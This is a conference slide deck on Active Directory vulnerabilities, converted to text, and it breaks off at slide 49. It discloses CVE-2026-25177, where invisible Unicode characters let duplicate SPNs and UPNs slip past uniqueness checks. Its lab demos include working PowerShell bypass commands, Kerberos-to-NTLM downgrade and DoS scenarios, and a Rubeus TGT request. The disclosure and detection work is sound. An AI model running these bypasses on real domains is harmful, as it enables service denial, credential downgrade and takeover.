---
title: "Identity Crisis Novel Vulnerabilities Leading to Kerberos Downgrade, DoS, and Full Domain Takeover"
speakers: ["Shai Laron"]
conference: "Black Hat"
conference_full: "Black Hat USA 2026"
edition: "USA"
year: 2026
source_pdf: "BlackHat_USA_2026_Slides/Shai Laron_Identity Crisis Novel Vulnerabilities Leading to Kerberos Downgrade, DoS, and Full Domain Takeover.pdf"
pages: 83
sha256: "bfc109e25c55c8d7b72a559ceee8a62fee742f0fee6ceb6b4243348be912e326"
text_chars: 45499
ocr_pages: 34
has_ocr: true
redacted_secrets: 0
ocr_confidence: 85.7
ocr_unreliable_blocks: 0
content_note: "All 83 pages were rendered and read against the source PDF by a vision model; 60 were rewritten and 23 confirmed correct. The ocr_* fields describe the superseded first-pass extraction."
vision_verified_pages_changed: 60
vision_verified_pages: 83
ocr_timeouts: 0
pages_recovered_from_text_layer: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T05:44:05Z"
---
# Identity Crisis Novel Vulnerabilities Leading to Kerberos Downgrade, DoS, and Full Domain Takeover

**Speakers:** Shai Laron  
**Conference:** Black Hat USA 2026  
**Source:** `BlackHat_USA_2026_Slides/Shai Laron_Identity Crisis Novel Vulnerabilities Leading to Kerberos Downgrade, DoS, and Full Domain Takeover.pdf` (83 pages)


## Slide 1

IDENTITY CRISIS Novel Vulnerabilities Leading to Kerberos Downgrade, DoS, and Full Domain Takeover

## Slide 2

### Shai Laron | @shailaron

- Security Researcher @ **semperis** *(Semperis logo)*
- Specializing in Identity & Kerberos
- Like seeing how logical systems can break

## Slide 3

### AGENDA

•Background

•Unicode & LDAP problems •Thinking outside the box

•CVE #1: various impacts

•CVE #2: instant Domain Admin!

## Slide 4

### BACKGROUND

•Active Directory accepts some Unicode characters that are parsed in a non-visible way in ASCII •This allows creating seemingly duplicate users, which Active Directory **doesn’t** normally allow

## Slide 5

*Screenshot — Administrator: Windows PowerShell*

```text
PS C:\Users\Administrator> New-ADUser -Name "UniqueUser"
New-ADUser : The specified account already exists
At line:1 char:1
+ New-ADUser -Name "UniqueUser"
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ResourceExists: (CN=UniqueUser,CN=Users,DC=d01,DC=lab:String) [New-ADUser], ADIdentity
    + FullyQualifiedErrorId : ActiveDirectoryServer:1316,Microsoft.ActiveDirectory.Management.Commands.NewADUser

PS C:\Users\Administrator> New-ADUser -Name ("Unique" + [char]::ConvertFromUtf32([int]"0x200B") + "User") -PassThru

DistinguishedName : CN=UniqueU ser,CN=Users,DC=d01,DC=lab
Enabled           : False
GivenName         :
Name              : UniqueU ser
ObjectClass       : user
ObjectGUID        : c6239c9a-f286-4a8b-b0d2-d71bcd2fc6aa
SamAccountName    : UniqueU ser
SID               : S-1-5-21-2254163148-3480805063-3895145279-18038
Surname           :
UserPrincipalName :
```

*A pink box highlights the SamAccountName value `UniqueU ser`, with an arrow pointing at it.*

*Inset — Active Directory Users and Computers list:*

```text
UniqueUser    User
UniqueUser    User
```

## Slide 6

### THE SCRIPT

Search-StringInAD.ps1

- Create a dictionary of 29 “invisible” characters

- Get all properties of all objects in the domain (WhenCreated=*)

- Iterate through each attribute

- Convert the attribute to an array of characters

- Retrieve the Hex value of each character, and compare it against the dictionary

*Code panel on the right (editor line numbers included):*

```text
 91     # hash table of unicode characters + types
 92     $UnicodeCharTable = @{
 93         "0x200B" = "Zero Width Space (ZWSP)"
 94         "0x200C" = "Zero Width Non-Joiner (ZWNJ)"
 95         "0x200D" = "Zero Width Joiner (ZWJ)"
 96         "0xFEFF" = "Zero Width No-Break Space"
 97
 98         "0x00A0" = "No-Break Space (NBSP)"
 99         "0x2000" = "En Quad"
100         "0x2001" = "Em Quad"
101         "0x2002" = "En Space"
102         "0x2003" = "Em Space"
103         "0x2004" = "Three-Per-Em Space"
104         "0x2005" = "Four-Per-Em Space"
105         "0x2006" = "Six-Per-Em Space"
106         "0x2007" = "Figure Space"
107         "0x2008" = "Punctuation Space"
108         "0x2009" = "Thin Space"
109         "0x200A" = "Hair Space"
110         "0x205F" = "Medium Mathematical Space"
111         "0x202F" = "Narrow No-Break Space"
112
113         "0x200E" = "Left-to-Right Mark (LRM)"
114         "0x200F" = "Right-to-Left Mark (RLM)"
115         "0x202A" = "Left-to-Right Embedding (LRE)"
116         "0x202B" = "Right-to-Left Embedding (RLE)"
117         "0x202C" = "Pop Directional Formatting (PDF)"
118         "0x202D" = "Left-to-Right Override (LRO)"
119         "0x202E" = "Right-to-Left Override (RLO)"
120
121         "0xFFFC" = "Object Replacement Character"
122         "0xFFF9" = "Interlinear Annotation Anchor"
123         "0xFFFA" = "Interlinear Annotation Separator"
124         "0xFFFB" = "Interlinear Annotation Terminator"
125     }
```

## Slide 7

### I WANT TO KNOW

•Are there other “invisible” characters in AD? •How could the abuse of these characters be efficiently detected? (Will LDAP work?)

•Do hidden characters have uses apart from persistence?

## Slide 8

### I WANT TO KNOW

•Are there other “invisible” characters in AD? •How could the abuse of these characters be efficiently detected? (Will LDAP work?)

•Do hidden characters have uses apart from persistence?

## Slide 9

### INITIAL TESTING

- **0x200B** ✓
- **0x200C** ✗

```text
PS> New-ADUser -Name "UniqueUser"
PS> New-ADUser -Name "UniqueUser"
New-ADUser : The specified account already exists
At line:1 char:1
+ New-ADUser -Name "UniqueUser"
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ResourceExists: (CN=UniqueUser,CN=Users,DC=D01,DC=lab:String) [New-ADUser], ADIdentityAlreadyExistsException
    + FullyQualifiedErrorId : ActiveDirectoryServer:1316,Microsoft.ActiveDirectory.Management.Commands.NewADUser

PS> New-ADUser -Name "Unique$([char]::ConvertFromUtf32([int]"0x200B"))User"
PS> New-ADUser -Name "Unique$([char]::ConvertFromUtf32([int]"0x200C"))User"
New-ADUser : The specified account already exists
At line:1 char:1
+ New-ADUser -Name "Unique$([char]::ConvertFromUtf32([int]"0x200C"))Use ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ResourceExists: (CN=UniqueU ser,CN=Users,DC=D01,DC=lab:String) [New-ADUser], ADIdentityAlreadyExistsException
    + FullyQualifiedErrorId : ActiveDirectoryServer:1316,Microsoft.ActiveDirectory.Management.Commands.NewADUser

PS> _
```

*Inset overlapping the terminal — Active Directory Users and Computers list:*

```text
UniqueUser    User
UniqueUser    User
```

## Slide 10

*No slide text — two Active Directory Users and Computers screenshots side by side.*

*Left window — each Name is "Unique" + a different non-rendering Unicode character + "User":*

| Name | Type |
| --- | --- |
| Unique[unrendered char]User | User |
| Unique[unrendered char]User | User |
| Unique[blank gap]User | User |
| Unique[unrendered char]User | User |
| Unique[box glyph]User | User |

*Right window:*

| Name | Type |
| --- | --- |
| UniqueUser | User |
| UniqueUser | User |
| UniqueUser | User |
| UniqueUser | User |
| UniqueUser | User |
| UniqueUser | User |
| UniqueUser | User |
| UniqueUser | User |
| UniqueUser | User |
| UniqueUser | User |
| UniqueUser | User |
| UniqueUser | User |
| UniqueUser | User |
| … | |

## Slide 11

*Active Directory Users and Computers list:*

| Name | Type |
| --- | --- |
| 0x206CChar--Test | User |
| 0x206DChar--Test | User |
| 0x206EChar--Test | User |
| 0x206FChar--Test | User |
| 0xE0001Char--Test | User |
| 0xE0020Char--Test | User |
| 0xE0021Char--Test | User |
| 0xE0022Char--Test | User |
| 0xE0023Char--Test | User |
| … | |

*Callout on the right, with a pink arrow pointing at the gap in the first row's name:*

Unicode characters are here ☺

## Slide 12

### I WANT TO KNOW

~~•Are there other “invisible” characters in AD?~~

•How could the abuse of these characters be efficiently detected? (Will LDAP work?)

•Do hidden characters have uses apart from persistence?

## Slide 13

### USING LDAP

```
PS> $200B = [char]::ConvertFromUtf32([int]"0x200B")
PS> Get-ADObject -LDAPFilter "samaccountname=Unique$($200B)User"

DistinguishedName                     Name
-----------------                     ----
CN=UniqueU ser,CN=Users,DC=d01,DC=lab UniqueU ser
```

```
PS> $200C = [char]::ConvertFromUtf32([int]"0x200C")
PS> Get-ADObject -LDAPFilter "samaccountname=Unique$($200C)User"

DistinguishedName                    Name
-----------------                    ----
CN=UniqueUser,CN=Users,DC=d01,DC=lab UniqueUser
```

## Slide 14

### USING LDAP

```
PS> $200C = [char]::ConvertFromUtf32([int]"0x200C")
PS> (Get-ADObject -LDAPFilter "samaccountname=*$200C*").count
11704
```

## Slide 15

### USING LDAP

```
PS> Get-ADObject -LDAPFilter "samaccountname=0x200Cchar--Test" | select Name, DistinguishedName

Name              DistinguishedName
----              -----------------
0x200CChar-- Test CN=0x200CChar-- Test,OU=test,DC=d01,DC=lab
```

## Slide 16

### INVISIBLE CHARACTER TYPES

•Filterable characters: only 106 out of 385 •Characters treated as whitespaces: *char* returns all object names with spaces (e.g.,  “Domain Admins”, “Print Operators”)

• <u>Characters completely ignored by the DC: *char* returns all objects</u>

## Slide 17

### I WANT TO KNOW

~~•Are there other~~ “ ~~invisible~~ ” ~~characters in AD? •How could the abuse of these characters be efficiently detected? (Will LDAP work?)~~

•Do hidden characters have uses apart from persistence?

## Slide 18

### RECAP

• <u>Active Directory’s LDAP server completely ignores some Unicode characters</u>

**Theory:**

•There may be potential to bypass uniqueness constraints for any Unicode-based attribute.

## Slide 19

### SERVICE PRINCIPAL NAMES

## Slide 20

### SERVICE PRINCIPAL NAMES

TERMSRV/ServerA

*(brace diagram: **Service Class** labels `TERMSRV`, **Host** labels `ServerA`)*

Common service classes:

- CIFS - SMB file shares

- HTTP - Web servers

- TERMSRV - Remote Desktop Services

- LDAP

*Screenshot — "SERVERA Properties" dialog, Attribute Editor tab, with the "Multi-valued String Editor" open on top.*

Tabs (row 1): General | Operating System | Member Of | Delegation | Password Replication

Tabs (row 2): LAPS | Location | Managed By | Object | Security | Dial-in | **Attribute Editor**

Behind the editor, the Attributes list shows truncated entries: Attribu…, sAM…, sAM…, scrip…, secr…, secu…, seeA…, seria…, servi…, shad… (x6) [illegible]

**Multi-valued String Editor**

Attribute: servicePrincipalName

Value to add: *(empty)* — [Add]

Values:

```
HOST/SERVERA
HOST/ServerA.demo.lab
RestrictedKrbHost/SERVERA
RestrictedKrbHost/ServerA.demo.lab
TERMSRV/SERVERA
TERMSRV/ServerA.demo.lab
WSMAN/ServerA
WSMAN/ServerA.demo.lab
```

[Remove] (greyed) — [OK] — [Cancel]

## Slide 21

### SERVICE PRINCIPAL NAMES

•Identity

•Determines the ticket’s encryption key

•Stored in servicePrincipalName •Service == Identity + SPN •Unencrypted in tickets

```
HOST/SERVERA
HOST/ServerA.D01.lab
RestrictedKrbHost/SERVERA
RestrictedKrbHost/ServerA.D01.lab
TERMSRV/SERVERA
TERMSRV/ServerA.D01.lab
WSMAN/ServerA
WSMAN/ServerA.D01.lab
```

## Slide 22

### SPN ALIASES

•Forest-wide (Configuration partition) •sPNMappings attribute

```
HOST/SERVERA
HOST/ServerA.D01.lab
RestrictedKrbHost/SERVERA
RestrictedKrbHost/ServerA.D01.lab
TERMSRV/SERVERA
TERMSRV/ServerA.D01.lab
WSMAN/ServerA
WSMAN/ServerA.D01.lab
```

## Slide 23

### SPN ALIASES

host=alerter, appmgmt, cisvc, clipsrv, browser, dhcp, dnscache, replicator, eventlog, eventsystem, policyagent, oakley, dmserver, dns, mcsvc, fax, msiserver, ias, messenger, netlogon, netman, netdde, netddedsm, nmagent, plugplay, protectedstorage, rasman, rpclocator, rpc, rpcss, remoteaccess, rsvp, samss, scardsvr, scesrv, seclogon, scm, dcom, **cifs**, spooler, snmp, schedule, tapisrv, trksvr, trkwks, ups, time, wins, www, http, w3svc, iisadmin, msdtcr

## Slide 24

### SPN ALIASES

DC SPN search order:

1. Explicit SPN

2. **Only if an explicit SPN is not found**, check for aliases

```
/* First, try to look up the SPN directly. */
rt := LookupAttr(flags, servicePrincipalName, name)
if rt ≠ null then
  return rt
endif

/* Obtain SPN mappings value. */
obj := DescendantObject(ConfigNC(),
    "CN=Directory Service,CN=Windows NT,CN=Services,")
spnMappings := obj!sPNMappings
if spnMappings ≠ null
  mappedSpn := MapSPN(name, spnMappings)
  if mappedSpn ≠ null then
    /* try to lookup a mapped SPN */
    rt := LookupAttr(flags, servicePrincipalName, mappedSpn)
    if rt ≠ null then
      return rt
```

## Slide 25

*A tabby cat wearing a WWII-style military helmet, composited into a battlefield scene with soldiers, artillery, an aircraft and smoke.*

## Slide 26

### PREVIOUS PATCH #1: CVE-2021-42282

Added 3 new uniqueness verification checks: •User Principal Name (UPN) uniqueness •Service Principal Name (SPN) uniqueness •SPN alias uniqueness Enforced by dSHueristics (forest-wide configuration attribute), on by default

## Slide 27

KerberLoss CVE-2026-25177

## Slide 28

### KerberLoss: CVE-2026-25177

```
PS C:\Users\Attacker\Desktop> (Get-ADComputer ServerA -Properties serviceprincipalnames).serviceprincipalnames | sort
HOST/SERVERA
HOST/ServerA.demo.lab
RestrictedKrbHost/SERVERA
RestrictedKrbHost/ServerA.demo.lab
TERMSRV/SERVERA
TERMSRV/ServerA.demo.lab
WSMAN/ServerA
WSMAN/ServerA.demo.lab
PS C:\Users\Attacker\Desktop> Set-ADComputer ServerB -ServicePrincipalNames @{Add="HOST/ServerA"}
Set-ADComputer : The operation failed because SPN value provided for addition/modification is not unique forest-wide
At line:1 char:1
+ Set-ADComputer ServerB -ServicePrincipalNames @{Add="HOST/ServerA"}
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (ServerB:ADComputer) [Set-ADComputer], ADException
    + FullyQualifiedErrorId : ActiveDirectoryServer:8647,Microsoft.ActiveDirectory.Management.Commands.SetADComputer
PS C:\Users\Attacker\Desktop> Set-ADComputer ServerB -ServicePrincipalNames @{Add="HOST/S$([char]::ConvertFromUtf32([int]"0xE0154"))erverA"}
PS C:\Users\Attacker\Desktop>
```

## Slide 29

### KerberLoss: CVE-2026-25177

```
PS C:\Users\Attacker\Desktop> Set-ADComputer ServerB -ServicePrincipalNames @{Add="HOST/S$([char]::ConvertFromUtf32([int]"0xE0154"))erverA"}
PS C:\Users\Attacker\Desktop> Get-ADObject -LDAPFilter "serviceprincipalname=HOST/ServerA" | select DistinguishedName

DistinguishedName
-----------------
CN=SERVERA,CN=Computers,DC=demo,DC=lab
CN=SERVERB,CN=Computers,DC=demo,DC=lab
```

*The Office "Corporate needs you to find the differences" meme.*

- Left paper: **SPN**
- Right paper: **S{0xE0154}PN**
- Pam labeled: **DC**
- Caption: Kerberos needs you to find the differences between this picture and this picture.
- Reply: They're the same picture.

## Slide 30

OK, SO?

## Slide 31

# SCENARIO #1 Arbitrary DoS to HOST-mapped services

## Slide 32

*Full-screen screenshot of SERVERA's Windows desktop (blue background).*

Desktop icons: Recycle Bin, ImportantFi... (SERVERA), Wireshark

Overlay text (top centre):
- Host Name: HOST2
- User Name: ServerAdmin

Taskbar: Search

## Slide 33

Sequence diagram. Participants (left to right):

- Attacker
- User
- DC
- ServerA
- ServerB

Flow:

- The attacker has WriteSPN on ServerB
- SPN: HOST/ServerA
- Users can regularly access files on ServerA
- The attacker sets the cifs/ServerA SPN on ServerB bypassing uniqueness constraints
- SPN: cifs/ServerA
- The user requests a ticket for cifs/ServerA
- Q: Who has cifs/ServerA?
- A: ServerB
- Service ticket encrypted with ServerB's secret key
- Access files on ServerA
- KRB_AP_ERR_MODIFIED (Wrong key)

## Slide 34

# SCENARIO #2 Simplified SPN-Jacking

## Slide 35

### SPN-jacking

Diagram labels:

- Client: Administrator
- Server: cifs/ServerB
- Attacker
- AdminTo
- Host1
- AllowedToDelegateTo = cifs/ServerA
- WriteSPN
- SPN: host/ServerA ✕
- ServerA
- WriteSPN
- SPN: cifs/ServerA
- ServerB

## Slide 36

### SPN-jacking + KerberLoss

Diagram labels:

- Host1
- AllowedToDelegateTo = cifs/ServerA
- AdminTo
- Attacker
- WriteSPN ✕
- SPN: host/ServerA
- ServerA
- WriteSPN
- SPN: cifs/ServerA
- ServerB

## Slide 37

**Host Name: HOST1**
**User Name: attacker**

```text
PS C:\Users\Attacker\Desktop> hostname
Host1
PS C:\Users\Attacker\Desktop> whoami
demo\attacker
PS C:\Users\Attacker\Desktop> Get-ADUser attacker -Properties memberof,primarygroupid | select Name,MemberOf,primarygroupid

Name     MemberOf primarygroupid
----     -------- --------------
attacker {}                  513


PS C:\Users\Attacker\Desktop> (Get-Acl -Path "AD:CN=SERVERB,CN=Computers,DC=demo,DC=lab").Access | where {$_.IdentityReference -eq "DEMO\attacker"} | select
 ActiveDirectoryRights,ObjectType,@{Name='ObjectTypeString';Expression={$ObjectTypeHT[$_.ObjectType.Guid]}},ObjectFlags,AccessControlType,IdentityReference


ActiveDirectoryRights : WriteProperty
ObjectType            : f3a64788-5306-11d1-a9c5-0000f80367c1
ObjectTypeString      : Service-Principal-Name
ObjectFlags           : ObjectAceTypePresent
AccessControlType     : Allow
IdentityReference     : DEMO\attacker


PS C:\Users\Attacker\Desktop>
```

## Slide 38

**SCENARIO #3**

Authentication downgrade of any Kerberos service

Information Classification: General

## Slide 39

_Sequence diagram. Actors: Attacker, User, DC, ServerA, ServerB._

Note over Attacker: The attacker has WriteSPN on **ServerB**

Note over ServerA: SPN: HOST/ServerA

User -> ServerA: The user can regularly access files on ServerA

Attacker -> DC -> ServerB: The attacker sets the **HOST**/ServerA SPN on **ServerB** bypassing uniqueness constraints

Note over ServerB: SPN: **HOST/ServerA**

User -> DC: The user requests a ticket for cifs/ServerA

DC -> DC: No cifs SPN found

DC -> DC: Q: Who has HOST/ServerA? A: **duplicate SPN**

DC -> User: KDC_ERR_S_PRINCIPAL_UNKNOWN

User -> ServerA: Kerberos failed, automatically try NTLM

ServerA -> User: Seemingly normal access

Information Classification: General

## Slide 40

**Host Name: HOST2**
**User Name: ServerAdmin**

_Two windows: Wireshark capture (left) and File Explorer (right)._

### Wireshark — Capturing from Ethernet0 2

Menu: File  Edit  View  Go  Capture  Analyze  Statistics  Telephony  Wireless  Tools  Help

Display filter:

```text
((smb || kerberos || ntlmssp || _ws.col.protocol == "SMB2") && !(_ws.col.protocol == "BROWSER" || _ws.col.protocol == "DCERPC" || _ws.col.protocol == "LDAP"))
```

|No.|Protocol|Info|
|---|---|---|
|298|SMB2|Negotiate Protocol Request|
|299|SMB2|Negotiate Protocol Response|
|303|KRB5|AS-REQ|
|304|KRB5|KRB Error: KRB5KDC_ERR_PREAUTH_REQUIRED|
|311|KRB5|AS-REQ|
|312|KRB5|AS-REP|
|320|KRB5|TGS-REQ|
|322|KRB5|TGS-REP|
|327|SMB2|Session Setup Request|
|329|SMB2|Session Setup Response|
|330|SMB2|Tree Connect Request, Tree: '\\SERVERA\IPC$'|
|331|SMB2|Tree Connect Response, Tree: '\\SERVERA\IPC$'|
|332|SMB2|Ioctl Request FSCTL_QUERY_NETWORK_INTERFACE_INFO|
|333|SMB2|Ioctl Response FSCTL_QUERY_NETWORK_INTERFACE_INFO|
|334|SMB2|Ioctl Request FSCTL_DFS_GET_REFERRALS, Path: \SERVERA\ImportantFiles|

Packet detail:

```text
tkt-vno: 5
realm: DEMO.LAB
v sname
    name-type: kRB5-NT-SRV-INST (2)
    v sname-string: 2 items
        SNameString: cifs
        SNameString: SERVERA
> enc-part
> enc-part
```

Status bar: Ethernet0 2: <live capture in progress>   Packets: 4325 · Displayed: 38 (0.9%)   Profile: Default

### File Explorer — ImportantFiles

Address: Network > SERVERA > ImportantFiles — Search ImportantF

Toolbar: New, Sort, View, Preview

|Name|Date modified|
|---|---|
|Apps|11/03/2026 16:00|
|IT|11/03/2026 16:48|
|Shared Documents|11/03/2026 16:47|
|CEO.jpg|11/03/2026 15:59|
|passwords.txt|11/03/2026 16:48|

Navigation pane: Home, Gallery, OneDrive, Desktop, Downloads, Documents, Pictures, Music, Videos, This PC, Network

5 items — Select a file to preview

## Slide 41

**Host Name: HOST1**
**User Name: attacker**

```text
ActiveDirectoryRights : WriteProperty
ObjectType            : f3a64788-5306-11d1-a9c5-0000f80367c1
ObjectTypeString      : Service-Principal-Name
ObjectFlags           : ObjectAceTypePresent
AccessControlType     : Allow
IdentityReference     : DEMO\attacker
PS C:\Users\Attacker\Desktop> (Get-ADComputer ServerA -Properties serviceprincipalnames).serviceprincipalnames | sort
HOST/SERVERA
HOST/ServerA.demo.lab
RestrictedKrbHost/SERVERA
RestrictedKrbHost/ServerA.demo.lab
TERMSRV/SERVERA
TERMSRV/ServerA.demo.lab
WSMAN/ServerA
WSMAN/ServerA.demo.lab
PS C:\Users\Attacker\Desktop> Set-ADComputer ServerB -ServicePrincipalNames @{Add="HOST/ServerA"}
Set-ADComputer : The operation failed because SPN value provided for addition/modification is not unique forest-wide
At line:1 char:1
+ Set-ADComputer ServerB -ServicePrincipalNames @{Add="HOST/ServerA"}
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (ServerB:ADComputer) [Set-ADComputer], ADException
    + FullyQualifiedErrorId : ActiveDirectoryServer:8647,Microsoft.ActiveDirectory.Management.Commands.SetADComputer
PS C:\Users\Attacker\Desktop> Set-ADComputer ServerB -ServicePrincipalNames @{Add="HOST/S$([char]::ConvertFromUtf32([int]"0xE0154"))erverA"}
PS C:\Users\Attacker\Desktop> Get-ADObject -LDAPFilter "serviceprincipalname=HOST/ServerA" | select DistinguishedName

DistinguishedName
-----------------
CN=SERVERA,CN=Computers,DC=demo,DC=lab
CN=SERVERB,CN=Computers,DC=demo,DC=lab

PS C:\Users\Attacker\Desktop>
```

## Slide 42

**Host Name: HOST2**
**User Name: ServerAdmin**

_Two windows: Wireshark capture (left) and File Explorer (right). Overlay callouts: "Kerberos ✗" (red, on the TGS-REQ / KRB5KDC_ERR_S_PRINCIPAL_UNKNOWN rows) and "NTLM ✓" (pink, on the NTLMSSP session-setup rows)._

### Wireshark — KerberLoss_downgrade.pcapng

Menu: File  Edit  View  Go  Capture  Analyze  Statistics  Telephony  Wireless  Tools  Help

Display filter:

```text
((smb || kerberos || ntlmssp || _ws.col.protocol == "SMB2") && !(_ws.col.protocol == "BROWSER" || _ws.col.protocol == "DCERPC" || _ws.col.protocol == "LDAP"))
```

|No.|Protocol|Info|
|---|---|---|
|182|SMB2|Negotiate Protocol Response|
|195|KRB5|AS-REQ|
|196|KRB5|KRB Error: KRB5KDC_ERR_PREAUTH_REQUIRED|
|204|KRB5|AS-REQ|
|207|KRB5|AS-REP|
|215|KRB5|TGS-REQ|
|217|KRB5|KRB Error: KRB5KDC_ERR_S_PRINCIPAL_UNKNOWN|
|222|SMB2|Session Setup Request, NTLMSSP_NEGOTIATE|
|223|SMB2|Session Setup Response, Error: STATUS_MORE_PROCESSING_REQUIRED, NT[cut off]|
|225|SMB2|Session Setup Request, NTLMSSP_AUTH, User: DEMO\ServerAdmin|
|228|SMB2|Session Setup Response|
|229|SMB2|Tree Connect Request, Tree: '\\SERVERA\IPC$'|
|230|SMB2|Tree Connect Response, Tree: '\\SERVERA\IPC$'|
|231|SMB2|Ioctl Request FSCTL_QUERY_NETWORK_INTERFACE_INFO|
|232|SMB2|Ioctl Response FSCTL_QUERY_NETWORK_INTERFACE_INFO|

Packet detail:

```text
> Frame 229: Packet, 158 bytes on wire (12...
> Ethernet II, Src: VMware_9c:cb:85 (00:50...
> Internet Protocol Version 4, Src: 192.16...
> Transmission Control Protocol, Src Port:...
> NetBIOS Session Service
> SMB2 (Server Message Block Protocol vers...
```

Status bar: KerberLoss_downgrade.pcapng   Packets: 7321 · Displayed: 39 (0.5%)   Profile: Default

### File Explorer — ImportantFiles

Address: Network > SERVERA > ImportantFiles — Search ImportantF

Toolbar: New, Sort, View, Preview

|Name|Date modified|
|---|---|
|Apps|11/03/2026 16:00|
|IT|11/03/2026 16:48|
|Shared Documents|11/03/2026 16:47|
|CEO.jpg|11/03/2026 15:59|
|passwords.txt|11/03/2026 16:48|

Navigation pane: Home, Gallery, OneDrive, Desktop, Downloads, Documents, Pictures, Music, Videos, This PC, Network

5 items — Select a file to preview

## Slide 43

### KerberLoss: CVE-2026-25177

Without any permissions on the target:

- DOS of any HOST-mapped service in the forest
- Force any service in the forest, HOST-mapped or not, to use only NTLM
- Delegation scenarios

Information Classification: General

## Slide 44

### PREVIOUS PATCH #1: CVE-2021-42282

Added 3 new uniqueness verification checks:

- User Principal Name (UPN) uniqueness
- Service Principal Name (SPN) uniqueness
- SPN alias uniqueness

Enforced by dSHueristics (forest-wide configuration attribute), on by default

Information Classification: General

## Slide 45

```text
PS C:\Users\notadmin> Get-ADUser DemoAdmin1 | select DistinguishedName, SamAccountName, UserPrincipalName

DistinguishedName                     SamAccountName UserPrincipalName
-----------------                     -------------- -----------------
CN=DemoAdmin1,OU=Admin,DC=demo,DC=lab DemoAdmin1     DemoAdmin1@demo.lab


PS C:\Users\notadmin> Set-ADUser UPNUser -UserPrincipalName "DemoAdmin1@demo.lab"
Set-ADUser : The operation failed because UPN value provided for addition/modification is not unique forest-wide
At line:1 char:1
+ Set-ADUser UPNUser -UserPrincipalName "DemoAdmin1@demo.lab"
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (UPNUser:ADUser) [Set-ADUser], ADException
    + FullyQualifiedErrorId : ActiveDirectoryServer:8648,Microsoft.ActiveDirectory.Management.Commands.SetADUser
PS C:\Users\notadmin> Set-ADUser UPNUser -UserPrincipalName "Demo$([char]::ConvertFromUtf32([int]"0xE0154"))Admin1@demo.lab"
PS C:\Users\notadmin> Get-ADObject -LDAPFilter "userprincipalname=DemoAdmin1@demo.lab" -Properties SamAccountName,UserPrincipalName |
>> select DistinguishedName, SamAccountName, UserPrincipalName

DistinguishedName                     SamAccountName UserPrincipalName
-----------------                     -------------- -----------------
CN=DemoAdmin1,OU=Admin,DC=demo,DC=lab DemoAdmin1     DemoAdmin1@demo.lab
CN=UPNUser,CN=Users,DC=demo,DC=lab    UPNUser        Demo  Admin1@demo.lab
```

Information Classification: General

## Slide 46

### KERBEROS NAME TYPES

```text
Realm            ::= KerberosString

PrincipalName    ::= SEQUENCE {
    name-type        [0] Int32,
    name-string      [1] SEQUENCE OF KerberosString
}
```

Information Classification: General

## Slide 47

### KERBEROS NAME TYPES

|Name Type|Value|Meaning|
|---|---|---|
|NT-UNKNOWN|0|Name type not known|
|NT-PRINCIPAL|1|"Just the name of the principal" (SamAccountName)|
|NT-SRV-INST|2|Service and other unique instance (krbtgt)|
|NT-SRV-HST|3|Service with host name as instance (telnet, rcommands)|
|NT-SRV-XHST|4|Service with host as remaining components|
|NT-UID|5|Unique ID|
|NT-X500-PRINCIPAL|6|Encoded X.509 Distinguished name [RFC2253]|
|NT-SMTP-NAME|7|Name in form of SMTP email name (e.g., user@example.com)|
|NT-ENTERPRISE|10|Enterprise name (UserPrincipalName)|

Information Classification: General

## Slide 48

```text
PS C:\Users\notadmin\Desktop> Get-ADObject -LDAPFilter "userprincipalname=DemoAdmin1@demo.lab" -Properties SamAccountName,UserPrincipalName |
>> select DistinguishedName, SamAccountName, UserPrincipalName

DistinguishedName                     SamAccountName UserPrincipalName
-----------------                     -------------- -----------------
CN=DemoAdmin1,OU=Admin,DC=demo,DC=lab DemoAdmin1     DemoAdmin1@demo.lab
CN=UPNUser,CN=Users,DC=demo,DC=lab    UPNUser        Demo  Admin1@demo.lab


PS C:\Users\notadmin\Desktop> $upn = "Demo$([char]::ConvertFromUtf32([int]"0xE0154"))Admin1@demo.lab"
PS C:\Users\notadmin\Desktop> .\Rubeus.exe asktgt /user:$upn /password:Password1 /nowrap /suppenctype:AES256 /principaltype:enterprise

   ______        _
  (_____ \      | |
   _____) )_   _| |__  ____ _   _  ___
  |  __  /| | | |  _ \ / _  ) | | |/___)
  | |  \ \| |_| | |_) | (/ /| |_| |___ |
  |_|   |_|____/|____/ \____)____/(___/

  v2.3.3


[*] Action: Ask TGT

[*] Got domain: demo.lab
[*] Using rc4_hmac hash: 64F12CDDAA88057E06A81B54E73B949B
[*] Building AS-REQ (w/ preauth) for: 'demo.lab\Demo  Admin1@demo.lab'
[*] Using domain controller: 192.168.0.11:88

[X] KRB-ERROR (24) : KDC_ERR_PREAUTH_FAILED:
```

Information Classification: General

## Slide 49

```text
PS C:\Users\notadmin\Desktop> Get-ADObject -LDAPFilter "userprincipalname=DemoAdmin1@demo.lab" -Properties SamAccountName,UserPrincipalName |
>> select DistinguishedName, SamAccountName, UserPrincipalName

DistinguishedName                  SamAccountName UserPrincipalName
----------------                  -------------- -----------------
CN=UPNUser,CN=Users,DC=demo,DC=lab UPNUser        Demo  Admin1@demo.lab

PS C:\Users\notadmin\Desktop> $upn = "Demo$([char]::ConvertFromUtf32([int]"0xE0154"))Admin1@demo.lab"
PS C:\Users\notadmin\Desktop> .\Rubeus.exe asktgt /user:$upn /password:Password1 /nowrap /suppenctype:AES256 /principaltype:enterprise

ServiceName  : krbtgt/demo.lab
ServiceRealm : DEMO.LAB
UserName     : Demo  Admin1@demo.lab (NT_ENTERPRISE)
UserRealm    : DEMO.LAB
StartTime    : 7/5/2026 8:24:19 AM
EndTime      : 7/5/2026 6:24:19 PM
RenewTill    : 7/12/2026 8:24:19 AM
Flags        : name_canonicalize, pre_authent, initial, renewable, forwardable
KeyType      : aes256_cts_hmac_sha1
Base64(key)  : W8sCfPyTHXjVi39rgBSVM1DPFV0t17Sxavsgkcrlr4Y=
